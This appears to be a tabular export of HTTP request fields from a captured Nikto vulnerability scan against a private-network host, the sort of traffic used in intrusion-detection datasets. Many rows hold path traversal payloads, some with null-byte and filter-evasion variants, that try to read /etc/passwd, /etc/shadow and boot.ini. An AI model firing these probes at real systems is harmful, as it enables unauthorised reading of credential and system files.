http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																	Keep-Alive										192.168.1.101									8035						1	http://192.168.1.101/web/emml_email_func.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002340)				/web/emml_email_func.php
																	Keep-Alive										192.168.1.101									8041						1	http://192.168.1.101/web/emumail.cgi?type=.%00		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002341)				/web/emumail.cgi?type=.%00
																	Keep-Alive										192.168.1.101									8047						1	http://192.168.1.101/web/entete.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002342)				/web/entete.php
																	Keep-Alive										192.168.1.101									8053						1	http://192.168.1.101/web/enteteacceuil.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002343)				/web/enteteacceuil.php
																	Keep-Alive										192.168.1.101									8060						1	http://192.168.1.101/web/etc/shadow+		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002344)				/web/etc/shadow+
																	Keep-Alive										192.168.1.101									8068						1	http://192.168.1.101/web/eventcal2.php.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002345)				/web/eventcal2.php.php
																	Keep-Alive										192.168.1.101									8074						1	http://192.168.1.101/web/ez2000/ezadmin.cgi		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002346)				/web/ez2000/ezadmin.cgi
																	Keep-Alive										192.168.1.101									8081						1	http://192.168.1.101/web/ez2000/ezboard.cgi		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002347)				/web/ez2000/ezboard.cgi
																	Keep-Alive										192.168.1.101									8088						1	http://192.168.1.101/web/ez2000/ezman.cgi		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002348)				/web/ez2000/ezman.cgi
																	Keep-Alive										192.168.1.101									8095						1	http://192.168.1.101/web/faqman/index.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002349)				/web/faqman/index.php
																	Keep-Alive										192.168.1.101									8102						1	http://192.168.1.101/web/filemanager/index.php3		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002350)				/web/filemanager/index.php3
																	Keep-Alive										192.168.1.101									8103						1	http://192.168.1.101/web/filemgmt/brokenfile.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002351)				/web/filemgmt/brokenfile.php
																	Keep-Alive										192.168.1.101									8110						1	http://192.168.1.101/web/filemgmt/singlefile.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002352)				/web/filemgmt/singlefile.php
																	Keep-Alive										192.168.1.101									8117						1	http://192.168.1.101/web/filemgmt/viewcat.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002353)				/web/filemgmt/viewcat.php
																	Keep-Alive										192.168.1.101									8124						1	http://192.168.1.101/web/filemgmt/visit.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002354)				/web/filemgmt/visit.php
																	Keep-Alive										192.168.1.101									8130						1	http://192.168.1.101/web/foro/YaBB.pl		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002355)				/web/foro/YaBB.pl
																	Keep-Alive										192.168.1.101									8136						1	http://192.168.1.101/web/forum-ra.asp?n=....//....//....//....//....//....//....//etc.passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002356)				/web/forum-ra.asp?n=....//....//....//....//....//....//....//etc.passwd
																	Keep-Alive										192.168.1.101									8143						1	http://192.168.1.101/web/forum-ra.asp?n=../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002357)				/web/forum-ra.asp?n=../../../../../../../../../etc/passwd
																	Keep-Alive										192.168.1.101									8150						1	http://192.168.1.101/web/forum-ra.asp?n=../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002358)				/web/forum-ra.asp?n=../../../../../../../../../etc/passwd%00
																	Keep-Alive										192.168.1.101									8157						1	http://192.168.1.101/web/forum-ra.asp?n=/../../../../../../../../../../../boot.ini		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002359)				/web/forum-ra.asp?n=/../../../../../../../../../../../boot.ini
																	Keep-Alive										192.168.1.101									8165						1	http://192.168.1.101/web/forum-ra.asp?n=/.\"./.\"./.\"./.\"./.\"./boot.ini		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002360)				/web/forum-ra.asp?n=/.\"./.\"./.\"./.\"./.\"./boot.ini
																	Keep-Alive										192.168.1.101									8172						1	http://192.168.1.101/web/forum-ra.asp?n=/etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002361)				/web/forum-ra.asp?n=/etc/passwd
																	Keep-Alive										192.168.1.101									8179						1	http://192.168.1.101/web/forum-ra.asp?n=/etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002362)				/web/forum-ra.asp?n=/etc/passwd%00
																	Keep-Alive										192.168.1.101									8186						1	http://192.168.1.101/web/forum-ra.asp?n=c:\boot.ini		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002363)				/web/forum-ra.asp?n=c:\boot.ini
																	Keep-Alive										192.168.1.101									8192						1	http://192.168.1.101/web/forum-ra_professionnel.asp?n=%60/etc/passwd%60		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002364)				/web/forum-ra_professionnel.asp?n=%60/etc/passwd%60
																	Keep-Alive										192.168.1.101									8199						1	http://192.168.1.101/web/forum-ra_professionnel.asp?n=../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002365)				/web/forum-ra_professionnel.asp?n=../../../../../../../../../etc/passwd%00
																	Keep-Alive										192.168.1.101									8206						1	http://192.168.1.101/web/forum-ra_professionnel.asp?n=../../boot.ini		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002366)				/web/forum-ra_professionnel.asp?n=../../boot.ini
																	Keep-Alive										192.168.1.101									8213						1	http://192.168.1.101/web/forum-ra_professionnel.asp?n=/....../boot.ini		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002367)				/web/forum-ra_professionnel.asp?n=/....../boot.ini
																	Keep-Alive										192.168.1.101									8219						1	http://192.168.1.101/web/forum-ra_professionnel.asp?n=/../../../../../../../../../../../../../../../../../../../../boot.ini		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002368)				/web/forum-ra_professionnel.asp?n=/../../../../../../../../../../../../../../../../../../../../boot.ini
																	Keep-Alive										192.168.1.101									8226						1	http://192.168.1.101/web/forum-ra_professionnel.asp?n=/../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002369)				/web/forum-ra_professionnel.asp?n=/../../../../../../etc/passwd
																	Keep-Alive										192.168.1.101									8233						1	http://192.168.1.101/web/forum-ra_professionnel.asp?n=/../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002370)				/web/forum-ra_professionnel.asp?n=/../../../etc/passwd
																	Keep-Alive										192.168.1.101									8240						1	http://192.168.1.101/web/forum-ra_professionnel.asp?n=/.\"./.\"./.\"./.\"./.\"./boot.ini		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002371)				/web/forum-ra_professionnel.asp?n=/.\"./.\"./.\"./.\"./.\"./boot.ini
																	Keep-Alive										192.168.1.101									8247						1	http://192.168.1.101/web/forum-ra_professionnel.asp?n=/etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002372)				/web/forum-ra_professionnel.asp?n=/etc/passwd
																	Keep-Alive										192.168.1.101									8254						1	http://192.168.1.101/web/forum-ra_professionnel.asp?n=/etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002373)				/web/forum-ra_professionnel.asp?n=/etc/passwd%00
																	Keep-Alive										192.168.1.101									8261						1	http://192.168.1.101/web/forum-ra_professionnel.asp?n=c:\boot.ini		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002374)				/web/forum-ra_professionnel.asp?n=c:\boot.ini
																	Keep-Alive										192.168.1.101									8268						1	http://192.168.1.101/web/forum.asp?n=%60/etc/passwd%60|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;`&#039;.		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002375)				/web/forum.asp?n=%60/etc/passwd%60|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;`&#039;.
																	Keep-Alive										192.168.1.101															1	http://192.168.1.101/web/forum.asp?n=../../../../../../../../../etc/passwd%00|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002376)				/web/forum.asp?n=../../../../../../../../../etc/passwd%00|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
																	Keep-Alive										192.168.1.101															1	http://192.168.1.101/web/forum.asp?n=../../boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002377)				/web/forum.asp?n=../../boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
																	Keep-Alive										192.168.1.101															1	http://192.168.1.101/web/forum.asp?n=/....../boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002378)				/web/forum.asp?n=/....../boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
																	Keep-Alive										192.168.1.101															1	http://192.168.1.101/web/forum.asp?n=/../../../../../../../../../../../../../../../../../../../../boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002379)				/web/forum.asp?n=/../../../../../../../../../../../../../../../../../../../../boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
																	Keep-Alive										192.168.1.101															1	http://192.168.1.101/web/forum.asp?n=/../../../../../../etc/passwd|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002380)				/web/forum.asp?n=/../../../../../../etc/passwd|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
																	Keep-Alive										192.168.1.101															1	http://192.168.1.101/web/forum.asp?n=/../../../etc/passwd|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002381)				/web/forum.asp?n=/../../../etc/passwd|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
																	Keep-Alive										192.168.1.101															1	http://192.168.1.101/web/forum.asp?n=/.\"./.\"./.\"./.\"./.\"./boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002382)				/web/forum.asp?n=/.\"./.\"./.\"./.\"./.\"./boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
																	Keep-Alive										192.168.1.101															1	http://192.168.1.101/web/forum.asp?n=/etc/passwd%00|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002383)				/web/forum.asp?n=/etc/passwd%00|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
																	Keep-Alive										192.168.1.101															1	http://192.168.1.101/web/forum.asp?n=/etc/passwd|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002384)				/web/forum.asp?n=/etc/passwd|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
																	Keep-Alive										192.168.1.101															1	http://192.168.1.101/web/forum.asp?n=c:\boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;c:&#039;.		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002385)				/web/forum.asp?n=c:\boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;c:&#039;.
																	Keep-Alive										192.168.1.101															1	http://192.168.1.101/web/forum/mainfile.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002386)				/web/forum/mainfile.php
																	Keep-Alive										192.168.1.101									8329						1	http://192.168.1.101/web/forum/member.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002387)				/web/forum/member.php
																	Keep-Alive										192.168.1.101									8338						1	http://192.168.1.101/web/forum/newreply.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002388)				/web/forum/newreply.php
																	Keep-Alive										192.168.1.101									8347						1	http://192.168.1.101/web/forum/newthread.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002389)				/web/forum/newthread.php
																	Keep-Alive										192.168.1.101									8355						1	http://192.168.1.101/web/forum1.asp?n=%60/etc/passwd%60&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002391)				/web/forum1.asp?n=%60/etc/passwd%60&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.
																	Keep-Alive										192.168.1.101									8362						1	http://192.168.1.101/web/forum1.asp?n=....//....//....//....//....//....//....//etc.passwd&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002392)				/web/forum1.asp?n=....//....//....//....//....//....//....//etc.passwd&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.
